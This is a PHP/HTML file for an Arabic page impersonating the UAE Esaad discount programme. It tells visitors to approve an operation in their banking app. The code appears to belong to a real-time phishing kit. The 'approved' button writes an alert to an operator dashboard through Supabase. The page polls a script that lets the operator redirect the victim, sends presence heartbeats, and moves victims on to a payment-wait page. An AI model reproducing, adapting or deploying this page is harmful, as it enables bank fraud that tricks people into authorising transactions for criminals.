<?php
session_start();
require_once __DIR__ . '/config.php';

if (isset($_POST['action']) && $_POST['action'] === 'trigger_dashboard_alert') {
    if (isset($_SESSION['user_id'])) {
        $userId = intval($_SESSION['user_id']);
        supabase_update('users', 'id=eq.' . $userId, [
            'message' => 'الموافقة من التطبيق البنكي',
            'page' => 's.php',
            'updated_at' => date('Y-m-d H:i:s')
        ]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>إسعاد | تأكيد عبر التطبيق</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --esaad-green: #1f6f3d;
            --esaad-green-dark: #165a30;
            --esaad-green-light: #e8f5ed;
            --esaad-gold: #d4af37;
            --esaad-dark: #1a3c1a;
            --esaad-gray: #6B7280;
            --esaad-light: #F9FAFB;
            --esaad-white: #FFFFFF;
            --esaad-border: #E5E7EB;
            --esaad-radius: 16px;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
            background: var(--esaad-light);
            color: #1E293B;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* === Navbar === */
        .esaad-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 24px;
            background: var(--esaad-white);
            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .esaad-nav .logo-img {
            height: 50px;
        }
        .esaad-nav .back-btn {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            background: var(--esaad-green-light);
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--esaad-green);
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
        }
        .esaad-nav .back-btn:hover {
            background: var(--esaad-green);
            color: #fff;
        }

        /* === Step Indicator === */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            padding: 16px;
            background: var(--esaad-white);
            border-bottom: 1px solid var(--esaad-border);
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--esaad-border);
        }
        .step-dot.completed {
            background: var(--esaad-green);
        }
        .step-dot.active {
            background: var(--esaad-gold);
            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        @keyframes dotPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.3); }
        }

        /* === Main Content === */
        .content-wrap {
            flex: 1;
            padding: 0 16px 24px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
        }

        .confirm-card {
            background: var(--esaad-white);
            border-radius: var(--esaad-radius);
            padding: 32px 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            border: 1px solid var(--esaad-border);
            text-align: center;
            margin-top: 20px;
        }

        /* === Phone Animation === */
        .phone-icon-wrap {
            width: 90px;
            height: 90px;
            background: var(--esaad-green-light);
            border: 2px solid rgba(31, 111, 61, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            position: relative;
        }
        .phone-icon-wrap i {
            font-size: 38px;
            color: var(--esaad-green);
        }
        .phone-icon-wrap .ring-pulse {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid rgba(31, 111, 61, 0.3);
            animation: ringPulse 2s ease-out infinite;
        }
        .phone-icon-wrap .ring-pulse:nth-child(2) {
            animation-delay: 0.6s;
        }

        @keyframes ringPulse {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.6); opacity: 0; }
        }

        .confirm-title {
            font-size: 22px;
            font-weight: 800;
            color: #1E293B;
            margin-bottom: 8px;
        }

        .confirm-subtitle {
            font-size: 14px;
            color: var(--esaad-gray);
            margin-bottom: 6px;
        }

        .confirm-desc {
            color: var(--esaad-gray);
            font-size: 14px;
            line-height: 1.9;
            margin-bottom: 24px;
            padding: 0 8px;
        }

        /* === Steps List === */
        .steps-list {
            background: var(--esaad-green-light);
            border: 1px solid rgba(31, 111, 61, 0.2);
            border-radius: 14px;
            padding: 18px 16px;
            margin-bottom: 24px;
            text-align: right;
        }
        .steps-list .step-title {
            font-size: 14px;
            font-weight: 700;
            color: var(--esaad-green);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .steps-list .step-item {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-bottom: 10px;
        }
        .steps-list .step-item:last-child {
            margin-bottom: 0;
        }
        .steps-list .step-num {
            width: 24px;
            height: 24px;
            min-width: 24px;
            background: var(--esaad-green);
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 700;
        }
        .steps-list .step-text {
            font-size: 13px;
            color: #374151;
            line-height: 1.7;
            padding-top: 2px;
        }

        /* === Timer === */
        .timer-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: var(--esaad-green-light);
            border: 1px solid rgba(31, 111, 61, 0.3);
            border-radius: 20px;
            padding: 8px 16px;
            margin-bottom: 20px;
        }
        .timer-badge i {
            color: var(--esaad-green);
            font-size: 14px;
        }
        .timer-badge span {
            color: var(--esaad-dark);
            font-size: 14px;
            font-weight: 700;
        }

        /* === Waiting Animation === */
        .waiting-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        .waiting-dots .dot {
            width: 10px;
            height: 10px;
            background: var(--esaad-green);
            border-radius: 50%;
            animation: dotBounce 1.4s ease-in-out infinite;
        }
        .waiting-dots .dot:nth-child(2) { animation-delay: 0.2s; }
        .waiting-dots .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotBounce {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
            40% { transform: scale(1); opacity: 1; }
        }

        /* === Continue Button === */
        .btn-continue {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 15px 32px;
            border-radius: 12px;
            border: none;
            background: linear-gradient(135deg, #1f6f3d, #165a30);
            color: #ffffff;
            text-decoration: none;
            font-size: 17px;
            font-weight: 700;
            font-family: 'Tajawal', system-ui, sans-serif;
            transition: all 0.3s ease;
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(31, 111, 61, 0.3);
            gap: 8px;
        }
        .btn-continue:hover:not(.is-loading) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(31, 111, 61, 0.4);
            color: #fff;
        }
        .btn-continue.is-loading {
            pointer-events: none;
            opacity: 0.85;
        }

        /* === Info Note === */
        .info-note {
            background: var(--esaad-green-light);
            border: 1px solid rgba(31, 111, 61, 0.2);
            border-radius: 12px;
            padding: 12px 14px;
            margin-top: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .info-note i {
            color: var(--esaad-green);
            font-size: 16px;
        }
        .info-note p {
            font-size: 12px;
            color: #374151;
            line-height: 1.7;
            margin: 0;
        }

        /* === Toast === */
        .approval-toast {
            position: fixed;
            top: 28px;
            left: 50%;
            transform: translateX(-50%) translateY(-20px);
            background: var(--esaad-green);
            color: #ffffff;
            padding: 14px 22px;
            border-radius: 12px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.18);
            font-size: 17px;
            font-weight: 700;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.25s ease, transform 0.25s ease, visibility 0.25s ease;
            z-index: 9999;
            white-space: nowrap;
        }
        .approval-toast.show {
            opacity: 1;
            visibility: visible;
            transform: translateX(-50%) translateY(0);
        }

        /* === Error === */
        .error-msg {
            color: #DC2626;
            font-weight: 600;
            font-size: 13px;
            margin-top: 16px;
            padding: 10px 14px;
            background: #FEF2F2;
            border: 1px solid #FECACA;
            border-radius: 10px;
            line-height: 1.7;
            text-align: right;
            display: none;
        }

        /* === Footer === */
        .esaad-footer {
            background: linear-gradient(135deg, #165a30, #1f6f3d);
            color: var(--esaad-white);
            padding: 24px 16px;
            text-align: center;
            margin-top: auto;
        }
        .esaad-footer .footer-logo {
            height: 45px;
            margin-bottom: 12px;
        }
        .esaad-footer .footer-brand {
            color: var(--esaad-gold);
            font-weight: 600;
            font-size: 13px;
            margin-bottom: 4px;
        }
        .esaad-footer p {
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            line-height: 1.7;
        }
        .esaad-footer .footer-bottom {
            border-top: 1px solid rgba(255,255,255,0.15);
            padding-top: 12px;
            margin-top: 12px;
            font-size: 11px;
            color: rgba(255,255,255,0.5);
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeInUp 0.6s ease-out;
        }
    </style>
</head>
<body>

    <!-- Toast -->
    <div class="approval-toast" id="approvalToast">تمت الموافقة على الطلب</div>

    <!-- Navbar -->
    <nav class="esaad-nav">
        <a href="index.php" class="back-btn">
            <i class="fas fa-arrow-right"></i>
        </a>
        <img src="./assets/sahara_brand_logo.png" alt="إسعاد" class="logo-img">
        <div style="width:36px;"></div>
    </nav>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step-dot completed"></div>
        <div class="step-dot completed"></div>
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
    </div>

    <!-- Content -->
    <div class="content-wrap fade-in">
        <div class="confirm-card">

            <!-- Phone Animation -->
            <div class="phone-icon-wrap">
                <div class="ring-pulse"></div>
                <div class="ring-pulse"></div>
                <i class="fas fa-mobile-alt"></i>
            </div>

            <h2 class="confirm-title">تأكيد عبر التطبيق البنكي</h2>
            <p class="confirm-subtitle">يرجى الموافقة على العملية من تطبيق البنك</p>

            <p class="confirm-desc">
                تم إرسال طلب تأكيد إلى تطبيق البنك الخاص بك.<br>
                يرجى فتح التطبيق والموافقة على العملية لإتمام التسجيل.
            </p>

            <!-- Waiting Animation -->
            <div class="waiting-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>

            <!-- Timer -->
            <div class="timer-badge">
                <i class="fas fa-clock"></i>
                <span id="time">03:00</span>
            </div>

            <!-- Steps -->
            <div class="steps-list">
                <div class="step-title">
                    <i class="fas fa-list-ol"></i>
                    خطوات التأكيد
                </div>
                <div class="step-item">
                    <div class="step-num">1</div>
                    <div class="step-text">افتح تطبيق البنك على جوالك</div>
                </div>
                <div class="step-item">
                    <div class="step-num">2</div>
                    <div class="step-text">ستجد إشعار بطلب تأكيد العملية</div>
                </div>
                <div class="step-item">
                    <div class="step-num">3</div>
                    <div class="step-text">اضغط على "موافقة" لإتمام العملية</div>
                </div>
            </div>

            <!-- Continue Button -->
            <a class="btn-continue" id="continueBtn" href="javascript:void(0);">
                <i class="fas fa-check-circle"></i>
                تمت الموافقة
            </a>

            <!-- Error Message (hidden by default) -->
            <div class="error-msg" id="errorMsg">
                <i class="fas fa-exclamation-circle" style="margin-left: 4px;"></i>
                لم يتم التأكيد بعد. يرجى فتح تطبيق البنك والموافقة على العملية.
            </div>

            <!-- Info Note -->
            <div class="info-note">
                <i class="fas fa-shield-alt"></i>
                <p>اتصال آمن ومشفر بتقنية SSL 256-bit - إسعاد</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="esaad-footer">
        <img src="./assets/sahara_brand_logo.png" alt="إسعاد" class="footer-logo"><br>
        <p class="footer-brand">Esaad | إسعاد</p>
        <p>برنامج إسعاد للخصومات - الإمارات العربية المتحدة</p>
        <div class="footer-bottom">
            &copy; Esaad 2026 - جميع الحقوق محفوظة
        </div>
    </footer>

<script>
(function () {
    var btn = document.getElementById('continueBtn');
    var toast = document.getElementById('approvalToast');
    var hasRun = false;

    btn.addEventListener('click', function (event) {
        event.preventDefault();

        if (hasRun) {
            return;
        }

        hasRun = true;
        btn.classList.add('is-loading');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التأكيد...';
        toast.classList.add('show');

        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'action=trigger_dashboard_alert'
        })
        .catch(function () {})
        .finally(function () {
            setTimeout(function () {
                window.location.href = 'wait-payment.php';
            }, 2000);
        });
    });
})();
</script>

<!-- Timer -->
<script>
(function() {
    var totalSeconds = 180;
    var timerEl = document.getElementById('time');

    function updateTimer() {
        var minutes = Math.floor(totalSeconds / 60);
        var seconds = totalSeconds % 60;
        timerEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');

        if (totalSeconds > 0) {
            totalSeconds--;
            setTimeout(updateTimer, 1000);
        } else {
            timerEl.textContent = '00:00';
        }
    }
    updateTimer();
})();
</script>

<!-- Polling Redirect -->
<script>
function checkRedirect() {
    fetch('polling-redirect.php')
        .then(r => r.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            }
        })
        .catch(e => {});
}
setInterval(checkRedirect, 1500);
checkRedirect();
</script>

<!-- Heartbeat -->


<script>
// Heartbeat - تحديث حالة الاتصال فوراً
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
